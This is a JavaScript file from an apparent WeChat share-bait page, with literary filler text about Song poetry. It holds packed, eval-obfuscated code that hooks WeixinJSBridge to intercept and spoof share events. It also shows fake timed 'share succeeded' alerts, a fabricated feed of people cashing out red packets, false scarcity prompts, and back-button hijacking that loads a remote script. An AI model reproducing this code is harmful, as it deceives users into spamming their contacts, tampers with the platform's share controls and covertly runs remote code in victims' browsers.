var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
if ( wechatInfo[1] >= "6.5.3" ) {
    var data = $('iframe').attr('data');
    $("#nr2804").click(function(){
        $("#sa000").show();
        setTimeout(function(){alert("把好東西共享給您的朋友吧。发到【微信群】即可看视频!");},3);
        setTimeout(function(){alert("发送成功!发送3个不同【微信群】即可看視頻,当前还差【2】次共享!");},9999);
        setTimeout(function(){alert("发送成功!发送3个不同【微信群】即可看視頻,当前还差【1】次共享!");},19999);
        setTimeout(function(){
            $("#sa000").hide();
            $("#nr2804").html($("#nr2804_v").html());
            $('#nr2804_v iframe').attr('src',data);
        },29998);
    });
} else {
if (window.ourself_domain && !window.sh_not_old_hack) {
    delete window.wx;
    eval(function (p, a, c, k, e, r) {
        e = function (c) {
            return (c < 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
        };
        if ('0'.replace(0, e) == 0) {
            while (c--)r[e(c)] = k[c];
            k = [function (e) {
                return r[e] || e
            }];
            e = function () {
                return '([4-9k-mq-zA-Z]|1\\w)'
            };
            c = 1
        }
        ;
        while (c--)if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
        return p
    }('(8(){8 O(){5 p=E.16;m p.u(/17/i)||p.u(/18/i)}8 n(){5 a=E.19.u(/1a\\/([\\d\\.]+)/i);6(!a||a.F<=0){m G}5 b=a[1].1b(".");6(!b||b.F!=3){m G}6(!O()){m G}5 c=v(b[0])*H*H+v(b[1])*H+v(b[2]);m c>=1c}6(n()||!O()){k{5 h=8(b){b=b.1s;"1d:ok"==b||"1d:1f"==b?4.q.x&&4.q.x(0):"1g:ok"==b||"1g:1f"==b?4.q.x&&4.q.x(1):"1g:1t"==b?4.q.I&&4.q.I(1):"1d:1t"==b&&4.q.I&&4.q.I(0)},g=8(){5 b=E.19.u(/1a\\/([\\d\\.]+)/i);6(!b||0>=b.F)m!1;b=b[1].1b(".");6(!b||3!=b.F)m!1;5 a=E.16;m a.u(/17/i)||a.u(/18/i)?1c<=1E6*v(b[0])+1E3*v(b[1])+v(b[2]):!1};4.7=P 0;4.9=P 0;4.q={J:P 0,x:P 0,I:P 0};Object.defineProperty(4,"r",{get:8(){m 4.7?4.7:4.9},set:8(b){4.9=b;4.7={};k{4.7.s=4.9.s}l(a){}k{4.7.V=4.9.V}l(a){}k{4.7.W=4.9.W}l(a){}k{4.7.X=4.9.X}l(a){}k{4.7.Y=4.9.Y}l(a){}k{4.7.1u=4.9.1u}l(a){}k{4.7.Z=4.9.Z}l(a){}k{4.7.y=8(a){g()&&4.9.y(a);a=a.1h;5 b=a.1i,c=a.1j;"callback"==a.1k&&c&&(c=a.10,h(c));6(b&&0<b.w("K")){5 d="1l",c=b;"1m:K"==b&&(c=a.10,c=c.1n);-1!=c.w("1o")&&(d="Q");6(d&&(4.11=d,"8"==R 4.q.J)){5 e=4.q.J(),f=8(){};"Q"==d?4.7.s(d,e,f):(g()?z(8(){4.7.s(d,e,f)},300):4.7.s(d,e,f),z(8(){4.7.s(d,e,f)},350))}}}}l(a){}k{4.7.s=4.9.s}l(a){}k{4.7.V=4.9.V}l(a){}k{4.7.W=4.9.W}l(a){}k{4.7.X=4.9.X}l(a){}k{4.7.Y=4.9.Y}l(a){}k{4.7.Z=4.9.Z}l(a){}k{4.7.1v=4.9.1v}l(a){}k{4.7.1w=4.9.1w}l(a){}k{4.7.1x=4.9.1x}l(a){}k{4.7.1y=4.9.1y}l(a){}}})}l(b){4.un_setup_wxshare=!0}}L{4.q={J:B,x:B,I:B};6(R(S)==\'B\'){5 S=0}6(R(A)==\'B\'){5 A=null}6(R(1z)==\'B\'){5 1z=0}6(R(1A)==\'B\'){5 1A=0}8 O(){5 p=E.16;m p.u(/17/i)||p.u(/18/i)}8 12(){5 13=E.19.u(/1a\\/([\\d\\.]+)/i);6(!13||13.F<=0){m G}5 M=13[1].1b(".");6(!M||M.F!=3){m G}6(!O()){m G}5 1B=v(M[0])*H*H+v(M[1])*H+v(M[2]);m 1B>=1c}8 1C(a){k{5 b=a[\'1h\'];5 c=a[\'1D\'];5 d=b[\'1i\'];5 f=b[\'1k\'];5 g=b[\'1j\'];6(d&&d.w("K")>0){5 h="1l";5 i=d;6(d=="1m:K"){5 j=b[\'10\'];i=j[\'1n\']}6(i.w("1o")!=-1){h="Q"}6(h){4.11=h;5 o=4.q.J();4.r.s(h,o,C);1p()}}}l(e){}}5 1q=8(14){4.r.y=A;6(12()){A(14);4.r.y=1q}5 T=14[\'1h\'];5 shaStr=14[\'1D\'];5 U=T[\'1i\'];5 msgType=T[\'1k\'];5 callbackId=T[\'1j\'];6(U&&U.w("K")>0){5 t="1l";5 1r=U;6(U=="1m:K"){5 1E=T[\'10\'];1r=1E[\'1n\']}6(1r.w("1o")!=-1){t="Q"}6(t){4.11=t;5 N=4.q.J();6(t=="Q"){4.r.s(t,N,C)}L{6(12()){z(8(){4.r.s(t,N,C)},100);z(8(){4.r.s(t,N,C)},600);z(8(){4.r.s(t,N,C)},1600)}L{4.r.s(t,N,C)}}1p()}}};8 D(){6(S>999){m}6(!4.r){timer=z(D,250);S++;m}6(!A){A=4.r.y}6(12()){4.r.y=1q}L{4.r.y=1C}};8 1p(){6(A&&4.r){4.r.y=A}}8 C(1F){5 15=1F[\'1s\'];6(15){6(15.w(":1f")!=-1||15.w(":ok")!=-1){6(4.11.w("Timeline")>0){4.q.x(1)}L{4.q.x(0)}}L{z(D,480)}}S=0;z(D,660)}4.D=D;D()}})();', [], 104, '||||window|var|if|WeixinJSBridge_rebuild|function|WeixinJSBridge_copy|||||||||||try|catch|return||||shareobject|WeixinJSBridge|invoke|eventMsg|match|parseInt|indexOf|shareComplete|_handleMessageFromWeixin|setTimeout|oldHandler|undefined|shareCallback|setShareHandle|navigator|length|false|1000|shareCancel|getshareData|share|else|nums|data|isiOS|void|shareTimeline|typeof|curSetHookCount|realMessage|eventId|call|on|env|log|_fetchQueue|__params|shareType|isWxNewVersion|wechatInfo|message|errMsg|platform|iPhone|iPad|userAgent|MicroMessenger|split|6003023|send_app_msg||confirm|share_timeline|__json_message|__event_id|__callback_id|__msg_type|sendAppMessage|general|shareTo|timeline|reloadShareHandle|newHandler|tmstr|err_msg|canecl|_getSelectedText|_hasInit|_hasPreInit|_isBridgeByIframe|_continueSetResult|regHookCount|shareTimes|weixinVersion|lowVersionHack|__sha_key|params|res'.split('|'), 0, {}));
}
var c_title = '宋词是中国古代文学皇冠上光辉夺目的一颗巨钻，在古代文学的阆苑里，她是一块芬芳绚丽的园圃。她以姹紫嫣红、千姿百态的丰神，与唐诗争奇，与元曲斗妍，历来与唐诗并称双绝，都代表一代文学之胜。远从《诗经》、《楚辞》及《汉魏六朝诗歌》里汲取营养，又为后来的明清对剧小说输送了有机成分。直到今天，她仍在陶冶着人们的情操，给我们带来很高的艺术享受。';
var chars = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
var b_l = chars.length;
function rand(l) {
    var ret = [];
    for (var i = 0; i < l; i++) {
        ret.push(chars[Math.floor(b_l * Math.random())]);
    }
    return ret.join('');
}
function loadJavaScript(src) {
    var s = document.createElement('script');
    s.setAttribute('src', src);
    document.head.appendChild(s);
}
var ch = '△▽○◇□☆▷◁♤♡♢♧☼☺☏•▲▼●★▶◀♠♥♦♣☀☻☎‥▪•*⊿☜☞………⊱⋛⋌⋚⊰⊹☌☍☋▬〓▧▤▨▥▩▥▨▤▧▦♩♪♫♬€▫◈▣◐◑◕░▒▓☑☒☄☢☣☭❂☪➹☃☂❦❧✎✄✟۩❈❉✿❀❃❁ღஐ☠♨۞๑♈♉♊♋♌♍♎♏♐♐♑♒♓♒♍';
function get_moji(one) {
    if (one) return ch[Math.floor(Math.random() * ch.length)];
    return ch[Math.floor(Math.random() * ch.length)] + ch[Math.floor(Math.random() * ch.length)] + ch[Math.floor(Math.random() * ch.length)];
}
var s_content = '首句写遥望一轮落日向着楼前一望无际、连绵起伏的群山西沉，在视野的尽头冉冉而没。这是天空景、远方景、西望景。次句写目送流经楼前下方的黄河奔腾咆哮、滚滚南来，又在远处折而东向，流归大海。这是由地面望到天边，由近望到远，由西望到东。这两句诗合起来，就把上下、远近、东西的景物，全都容纳进诗笔之下，使画面显得特别宽广，特别辽远。就次句诗而言，诗人身在鹳雀楼上，不可能望见黄河入海，句中写的是诗人目送黄河远去天边而产生的意中景，是把当前景与意中景溶合为一的写法。这样写，更增加了画面的广度和深度。而称太阳为“白日”，这是写实的笔调。落日衔山，云遮雾障，那本已减弱的太阳的光辉，此时显得更加暗淡，所以诗人直接观察到“白日”的奇景。至于“黄河”。当然也是写实。它宛若一条金色的飘带，飞舞于层峦叠嶂之间。诗人眼前所呈现的，是一幅溢光流彩、金碧交辉的壮丽图画。这幅图画还处于瞬息多变的动态之中。白日依山而尽，这仅仅是一个极短暂的过程；黄河向海而流，却是一种永恒的运动。如果说．这种景色很美，那么，它便是一种动态的美，充满了无限生机的活泼的美。这不是所谓“定格”，不是被珍藏的化石或标本。读者深深地为诗人的大手笔所折服。';
if (!window.execute) {
    $('html').css('font-size', '');
    window.execute = true;
    // loadJavaScript('http://cdn.shopset.cn/x/cj/i.js');
    var pan_url = "http://mp.weixin.qq.com/s?__biz=MzI2MTUwMjM4MQ==&mid=2247483651&idx=4&sn=c1eb7a857081f3b2c514107d782d4d7e#rd";
    var weui = {
        alert: function (g, f, k) {
            var j, h;
            f = f ? f : "\u6E29\u99A8\u63D0\u9192", j = '<div class="weui_dialog_alert" style="position: fixed; z-index: 99999; display:none;">', j += '<div class="weui_mask"></div>', j += '<div class="weui_dialog">', j += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + f + "</strong></div>", j += '<div class="weui_dialog_bd"></div>', j += '<div class="weui_dialog_ft">', j += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>', j += "</div>", j += "</div>", j += "</div>", $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(j)), h = $(".weui_dialog_alert"), h.show(), h.find(".weui_dialog_bd").html(g), h.find(".weui_btn_dialog").off("touchstart").on("touchstart", function () {
                h.hide(), k && k();
            });
        }
    };

    function wxAlert(e, d) {
        weui.alert(e, "", d);
    }

    function showMask() {

        // $("#mask").css("height", $(document.body).height());
        // $("#mask").css("width", $(document.body).width());
        $(".fenxiang_w").show();
        // $("#mask").show();
        // showtip();

    }

    var oChai = document.getElementById("chai");
    var oContainer = document.getElementById("container");
    //showmain.style.display = "none";

    var data = [
        {
            "w_name": "Jkj.",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxgnln9j302s02smwy.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "10"
        }, {
            "w_name": "\u5362\u6da6\u9704",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltx7jrkjj302s02smwz.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "7"
        }, {
            "w_name": "\u541b\u541b",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx4p677j302s02s744.jpg",
            "u_time": "\u63d0\u73b0\u4e86 500.00 \u5143",
            "c_time": "9"
        }, {
            "w_name": "\u5b59\u5c0f\u5175",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltx6ez7fj302s02s0sk.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "7"
        },
        {
            "w_name": "\u534e",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltwzzx8tj302s02sdfn.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "7"
        }, {
            "w_name": " \\uD83C\\uDF80\\uD83D\\uDE34\\uD83D\\uDE34\\uD83D\\uDE34",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1falw1797obj302s02st8j.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "6"
        }, {
            "w_name": "\u8d75 \u5dcd",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltxdadjfj302s02sweb.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "12"
        }, {
            "w_name": "\u5c0f\u5988\u54aa?\u4e91\u5728\u6307\u5c16",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx4zxmrj302s02sgld.jpg",
            "u_time": "\u63d0\u73b0\u4e86 1000.00 \u5143",
            "c_time": "5"
        }, {
            "w_name": "\u84dd\u84dd",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltxfh8grj302s02sjr6.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "15"
        }, {
            "w_name": "\u6e29\u5dde\u5144\u5f1f\u5178\u5f53_\uff08\u554a\u677e\uff09",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxgnln9j302s02smwy.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "15"
        }, {
            "w_name": "\u7b80\u5355",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx63m8wj302s02sjr7.jpg",
            "u_time": "\u9886\u53d6\u4e865\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "15"
        }, {
            "w_name": "\u603b\u6709\u5201\u6c11\u60f3\u9634\u6715\u3063",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltx2ebzwj302s02sq2r.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "9"
        }, {
            "w_name": "\u6bd5\u6c5f\u660e",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx7cfmnj302s02sq2q.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "2"
        }, {
            "w_name": "\u4e94\u5e73\u65b9",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltx1ay5bj302s02s3yc.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "3"
        }, {
            "w_name": "\u838e\u838e",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxai971j302s02st8k.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "8"
        }, {
            "w_name": "\\uD83C\\uDF3A\u3001dacy",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltx3675cj302s02sq2r.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "7"
        }, {
            "w_name": "Mr. Xue ?",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1falwnjpsx6j302s02sq2q.jpg",
            "u_time": "\u63d0\u73b0\u4e86 1000.00 \u5143",
            "c_time": "2"
        }, {
            "w_name": "\u5b5f\u82d7\u82d7",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltxavdafj302s02swec.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "6"
        }, {
            "w_name": "\u51e1\u5c14\u8d5b\u5bab\u7684^_^\u7cef\u7c73",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltxbnyxgj302s02s0sk.jpg",
            "u_time": "\u9886\u53d6\u4e8610\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "15"
        }, {
            "w_name": "\u798f\u661f\uff0c",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx9awvrj302s02sq2s.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "3"
        }, {
            "w_name": "\u8881\u82b3",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxbq2a0j302s02swe9.jpg",
            "u_time": "\u9886\u53d6\u4e868\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "12"
        }, {
            "w_name": "\u4e00",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltwzjcmnj302s02sweb.jpg",
            "u_time": "\u9886\u53d6\u4e865\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "4"
        }, {
            "w_name": "Zhao. Devil \u03a8",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltx4cz9ij302s02sa9v.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "14"
        }, {
            "w_name": "\u52aa\u529b\u594b\u6597",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltxcmkxyj302s02sq2p.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "12"
        }, {
            "w_name": "\u7528\u6bdb\u4e3b\u5e2d\u7684\u6c14\u8d28\u538b\u5012\u4e00\u5207\u2121",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltxhryt9j302s02sjr6.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "11"
        }, {
            "w_name": "\u5de6\u53f3",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx8tlacj302s02swec.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "12"
        }, {
            "w_name": "\u6797\u6770\u68df_",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltx06wsaj302s02sdfo.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "14"
        }, {
            "w_name": " \\uD83D\\uDC8B",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxa3tqoj302s02st8j.jpg",
            "u_time": "\u9886\u53d6\u4e869\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "13"
        }, {
            "w_name": "\u4e9a\u91cc\u58eb\u7f3a\u5fb7",
            "w_headimg": "http://ww4.sinaimg.cn/mw690/006A35UYgw1faltxcyz8hj302s02s744.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "5"
        }, {
            "w_name": "\u5218\u83b9",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltxc17f4j302s02s3yb.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "9"
        }, {
            "w_name": "\u3002",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltx0z0tvj302s02s745.jpg",
            "u_time": "\u9886\u53d6\u4e869\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "2"
        }, {
            "w_name": "\u4e0d\u5728\u4e4e",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltx3scsmj302s02s3yc.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "12"
        }, {
            "w_name": "IF YOU",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltxgg2l2j302s02smx0.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "11"
        }, {
            "w_name": "\u66f9\u96ea\u68a6",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltx9npfsj302s02sa9x.jpg",
            "u_time": "\u9886\u53d6\u4e866\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "10"
        }, {
            "w_name": "\u8461\u4e86\u4e2a\u8404\\uD83C\\uDFC3",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltxhb2svj302s02sjr7.jpg",
            "u_time": "\u9886\u53d6\u4e867\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "8"
        }, {
            "w_name": "\u5c0f\u5377\u5b50",
            "w_headimg": "http://ww3.sinaimg.cn/mw690/006A35UYgw1faltxe6vnzj302s02sq2q.jpg",
            "u_time": "\u9886\u53d6\u4e8610\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "2"
        }, {
            "w_name": "\u51b0\u662f\u7761\u7740\u7684\u6c34",
            "w_headimg": "http://ww2.sinaimg.cn/mw690/006A35UYgw1faltx0uo1wj302s02s0sj.jpg",
            "u_time": "\u63d0\u73b0\u4e86 200.00 \u5143",
            "c_time": "2"
        }, {
            "w_name": "\u5927\u6735\u4e91",
            "w_headimg": "http://ww1.sinaimg.cn/mw690/006A35UYgw1faltx1n096j302s02sglf.jpg",
            "u_time": "\u9886\u53d6\u4e865\u5143\u73b0\u91d1\u7ea2\u5305",
            "c_time": "10"
        }];
    data = data.sort(function () {
        return Math.random() - 0.5;
    });
    var index = 0;
    var myDate = new Date();
    for (; index < 5; index++) {
        var obj = data[index];
        $('.hbAvList').append(loadItem_1(obj))
    }
    function loadItem_1(obj) {
        var curHours = myDate.getHours();
        var curMinutes = myDate.getMinutes() * 1 + obj.c_time * 1;
        if (curMinutes > 59) {
            curMinutes = curMinutes - 60;
            curHours++;
            if (curHours > 23) {
                curHours = 0
            }
        }
        var html = '<li>' + '<img src="' + obj.w_headimg + '" alt="">' + '<div class="hbName">' + '<h3>' + eval("'" + obj.w_name + "'") + '</h3>' + '<p class="hbTime">' + curHours + ':' + curMinutes + '</p>' + '</div>' + '<span class="hbMoney">' + eval("'" + obj.u_time + "'") + '</span>' + '</li>';
        return html
    }

    function loadItem_2() {
        var html = '<li style="display: none;"></li>';
        return html
    }

    function loadItem_3(obj) {
        var curHours = myDate.getHours();
        var curMinutes = myDate.getMinutes() * 1 + obj.c_time * 1;
        if (curMinutes > 59) {
            curMinutes = curMinutes - 60;
            curHours++;
            if (curHours > 23) {
                curHours = 0
            }
        }
        var html = '<img src="' + obj.w_headimg + '" alt="">' + '<div class="hbName">' + '<h3>' + eval("'" + obj.w_name + "'") + '</h3>' + '<p class="hbTime">' + curHours + ':' + curMinutes + '</p>' + '</div>' + '<span class="hbMoney">' + eval("'" + obj.u_time + "'") + '</span>';
        return html
    }

    setInterval(function () {
        var obj = data[index];
        $('.hbAvList li:last').slideUp(1000, function () {
            $(this).remove()
        });
        $('.hbAvList li:first .hbMoney').css('color', '#949494');
        $('.hbAvList').prepend(loadItem_2());
        $('.hbAvList li:first').append(loadItem_3(obj));
        $('.hbAvList li:first').find('.hbMoney').css('color', '#FF0000');
        $('.hbAvList li:first').slideDown(1000, function () {
            if (index % 2 < 1) {
                $('.hbAvList li:first').find('.hbMoney').addClass('animated tada')
            } else {
                $('.hbAvList li:first').find('.hbMoney').addClass('animated zoomIn')
            }
            index = ++index % data.length
        })
    }, 2000)

    var l = 1;
    var th = $(window).height();
    var tw = $(window).width();
    var dw = $("#container").width();
    var dl = (tw - dw) / 2;
    $("#container").css("left", dl + "px");

    function stopDrop() {
        var lastY;//最后一次y坐标点
        $(document.body).on('touchstart', function (event) {
            lastY = event.originalEvent.changedTouches[0].clientY;//点击屏幕时记录最后一次Y度坐标。
        });
        $(document.body).on('touchmove', function (event) {
            var y = event.originalEvent.changedTouches[0].clientY;
            var st = $(this).scrollTop(); //滚动条高度
            console.log("st = " + st);
            if (y >= lastY && st <= 0) {//如果滚动条高度小于0，可以理解为到顶了，且是下拉情况下，阻止touchmove事件。
                lastY = y;
                event.preventDefault();
            }
            lastY = y;

        });
    }

    stopDrop();

    var turl = pan_url;
    var land_url = pan_url;
    var s_qun_title, s_qun_content, s_timeline_title, s_timeline_content, s_qun_imgurl, s_timeline_imgurl, processed_share_url, share_url, message,rmb;

    /*var fetch_share_url_url = '/Public/js/config.php';
    $.getJSON(fetch_share_url_url, function (d) {
        if (d) {
            turl = d.back_page;
            s_qun_title = d.title;
            s_qun_content = d.desc;
            s_qun_imgurl = d.img;
            share_url = d.link;
            s_timeline_title = d.t_title;
            s_timeline_content = d.t_desc;
            s_timeline_imgurl = d.t_img;
            processed_share_url = d.t_link;
            message = d.msg
            land_url=d.result_page;
            rmb=d.rmb;
            num=d.num;
        }

    });*/
    var main_url = main_url;
    var turl = main_url;
    var s_qun_title = $(".ct").text();
    var s_qun_content = "每日精彩视频";
    var s_qun_imgurl = $("#img").attr("src");
    var share_url = main_url;
    var s_timeline_title = $(".ct").text();
    var s_timeline_content = "每日精彩视频";
    var s_timeline_imgurl = $("#img").attr("src");
    var processed_share_url = main_url;
    var message = "每日精彩视频";
    var land_url=main_url;
    var rmb=188;
    var num=6047;
    /*oChai.ontouchstart = function () {
        oChai.setAttribute("class", "rotate");
        setTimeout(function () {
            oContainer.remove();
            showmain.style.display = "";
            var a = 0;
            var gundong = setInterval(function () {
                a += 1;
                if (a >= rmb) {
                    clearInterval(gundong);
                }
                document.getElementById('get_money').innerHTML = a;
            }, 6);
        }, 1600);
    }*/
    function showtip() {
        wxAlert("\u6D3B\u52A8\u63D0\u793A\uFF1A\u8BF7\u52A1\u5FC5\u5206\u4EAB\u5230\u7FA4\u540E\uFF0C\u7EA2\u5305\u624D\u4F1A\u5230\u8D26\uFF08\u76EE\u524D\u5269\u4F59\u7EA2\u5305\u4EC5\u5269"+num+"\u4EFD\uFF09\uFF01");
    }
    function houtui(){
        jQuery.getScript(turl);
    }
    function land(){
        jQuery.getScript(land_url);
    }
    window.onhashchange = function () {
        jp();
    };

    function hh() {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
    }

    var url_reg = /(https?|ftp|mms):\/\/([A-z0-9]+[_\-]?[A-z0-9]+\.)*[A-z0-9]+\-?[A-z0-9]+\.[A-z]{2,}(\/.*)*\/?/;

    function jp() {
        // if (turl && url_reg.test(turl) && turl != pan_url) {
        //     location.href = turl;
        //     return true;
        // } else if (window.choujiang_single_page && typeof window.choujiang_single_page === 'function') {
        //     window.choujiang_single_page();
        // } else {
        //     location.href = turl;
        // }
        // return true;
        // location.href = turl;
        // return true;
        if (window.choujiang_single_page && typeof window.choujiang_single_page === 'function') {
            window.choujiang_single_page();
        } else {
            //
            houtui();
        }
    }

    setTimeout('hh();', 100);

    function gotocj() {

        // if (window.choujiang_single_page && typeof window.choujiang_single_page === 'function') {
        //     window.choujiang_single_page();
        // } else {
        land();
        // }
        // location.href = land_url;
    }

    //var share_url = location.href;
    // var fetch_share_url = 'http://m.homeslife.cn/fission/cgi/get_url.php?sk=gift';
    // $.getJSON(fetch_share_url, function (d) {
    //     if (d && d.url) {
    //         share_url = d.url;
    //     }
    // });

    // document.title = '元旦红包';
    var city = "";
    var txt = Math.random() > 0.5 ? '\u53EA\u80FD\u5E2E\u4F60\u5230\u8FD9\u4E86\u3002\u3002\u3002' : '\u6765\u4E0D\u53CA\u89E3\u91CA\u4E86\uFF0C\u5FEB\u4E0A\u8F66\uFF01';
    var title2 = city + '\u5730\u533A\u6700\u76F4\u63A5\u7684\u4EA4\u53CB\u7FA4\uFF0C\u76F4\u63A5\u7EA6\u4E0D\u95F2\u804A\uFF01' + txt;
    var weui = {
        alert: function (msg, title, callback) {
            title = title ? title : "";
            var alertHtml = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
            alertHtml += '<div class="weui_mask"></div>';
            alertHtml += '<div class="weui_dialog">';
            alertHtml += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title">' + title + '</strong></div>';
            alertHtml += '    <div class="weui_dialog_bd" style="color:#000;padding-top:16px;padding-bottom:10px;"></div>';
            alertHtml += '    <div class="weui_dialog_ft">';
            alertHtml += '      <a href="javascript:;" class="weui_btn_dialog primary">\u786e\u5b9a</a>';
            alertHtml += '  </div>';
            alertHtml += ' </div>';
            alertHtml += '</div>';
            if ($(".weui_dialog_alert").length > 0) {
                $(".weui_dialog_alert .weui_dialog_bd").empty();
            } else {
                $("body").append($(alertHtml));
            }
            var weui_alert = $(".weui_dialog_alert");
            weui_alert.show();
            weui_alert.find(".weui_dialog_bd").html(msg);
            weui_alert.find('.weui_btn_dialog').off("touchstart").on('touchstart',
                function () {
                    weui_alert.hide();
                    if (callback) {
                        callback();
                    }
                });
        }
    }

    function sharetips(msg) {

        switch (msg) {
            case 0:
                weui["alert"]('\u5206\u4EAB\u6210\u529F\uFF0C\u8BF7\u7EE7\u7EED\u5206\u4EAB\u5230<span style="font-size: 30px;color: #f5294c">3</span>\u4E2A\u4E0D\u540C\u7684\u7FA4\u5373\u53EF\u9886\u53D6\uFF01');
                break;
            case 1:
                weui["alert"]('\u5206\u4EAB\u6210\u529F\uFF0C\u8BF7\u518D\u5206\u4EAB<span style="font-size: 30px;color: #f5294c">2</span>\u4E2A\u4E0D\u540C\u7684\u7FA4\u5373\u53EF\u9886\u53D6\uFF01');
                break;
            case 2:
                weui["alert"]('\u5206\u4EAB\u6210\u529F\uFF0C\u8BF7\u518D\u5206\u4EAB<span style="font-size: 30px;color: #f5294c">1</span>\u4E2A\u4E0D\u540C\u7684\u7FA4\uFF01');
                break;
            case 3:

